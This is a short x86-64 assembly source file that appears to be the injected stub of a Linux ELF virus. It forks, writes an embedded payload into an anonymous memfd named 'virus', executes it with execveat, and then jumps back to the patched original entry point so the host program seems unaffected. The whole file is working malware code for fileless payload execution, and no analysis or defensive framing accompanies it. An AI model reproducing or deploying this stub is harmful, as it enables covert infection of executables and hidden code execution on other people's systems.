bits 64
global _start
default rel

section .text
_start:
    push rax
    push rdi
    push rsi
    push rdx
    push rcx
    push r8
    push r9
    push r10
    push r11

    ; --- fork ---
    mov rax, 57                             ; sys_fork
    syscall
    test rax, rax
    jnz parent                              ; normal execution for parent

    ; --- memfd r15 = fd ---
    mov rax, 319                            ; sys_memfd_create
    lea rdi, [rel memfd_name]               ; name
    xor rsi, rsi                            ; flags
    syscall
    test rax, rax
    js error
    mov r15, rax                            ; r15 = fd

    ; --- write ---
    mov rax, 1                              ; sys_write
    mov rdi, r15                            ; fd
    lea rsi, [rel payload]                  ; buffer
    mov rdx, [rel payload_size]             ; nbyte

write_loop:
    mov rax, 1                              ; sys_write
    syscall
    test rax, rax
    js error
    jz error
    add rsi, rax                            ; increase buffer
    sub rdx, rax                            ; decrease nbyte
    jnz write_loop

    ; --- execveat ---
    mov rax, 322                            ; sys_execveat
    mov rdi, r15                            ; fd
    lea rsi, [rel empty_path]               ; path
    xor rdx, rdx                            ; argv
    xor r10, r10                            ; envp
    mov r8, 0x1000                          ; flags (AT_EMPTY_PATH)
    syscall

    ; --- child exit ---
    mov rax, 60                             ; sys_exit
    mov rdi, 1
    syscall

parent:
error:
    pop r11
    pop r10
    pop r9
    pop r8
    pop rcx
    pop rdx
    pop rsi
    pop rdi
    pop rax

    ; --- jmp original entry point ---
    db  0xE9                                ; jmp
    dd  0x11111111                          ; patch with OEP

memfd_name:     db "virus", 0
empty_path:     db 0

payload_size:   dq 0x2222222222222222       ; patch payload_size
payload:        db 0x33                     ; patch payload
